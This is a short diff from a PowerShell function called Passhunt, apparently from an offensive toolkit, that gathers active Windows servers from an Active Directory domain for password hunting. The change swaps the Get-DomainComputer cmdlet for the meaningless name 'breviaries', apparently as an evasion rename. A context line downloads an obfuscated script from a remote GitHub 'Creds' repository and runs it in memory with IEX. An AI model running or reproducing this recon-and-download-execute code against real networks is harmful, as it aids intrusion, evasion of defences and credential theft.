@@ -1731,7 +1731,7 @@ function Passhunt
         if ($domain)
         {
             Write-Host -ForegroundColor Yellow 'Collecting active Windows Servers from the domain...'
-            $ActiveServers = Get-DomainComputer -Ping -OperatingSystem "Windows Server*"
+            $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
             $ActiveServers.dnshostname >> "$currentPath\DomainRecon\activeservers.txt"
 
             IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewobfs.ps1')
